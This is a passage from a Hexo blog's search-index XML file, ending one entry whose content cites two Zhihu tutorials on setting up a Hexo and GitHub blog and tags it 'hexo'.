href="https://zhuanlan.zhihu.com/p/35668237">超详细Hexo+Github博客搭建小白教程 - 知乎 (zhihu.com)</a>)</p><p>[参考知乎教程2](<a href="https://zhuanlan.zhihu.com/p/60578464">使用 Hexo+GitHub 搭建个人免费博客教程（小白向） - 知乎 (zhihu.com)</a>)</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
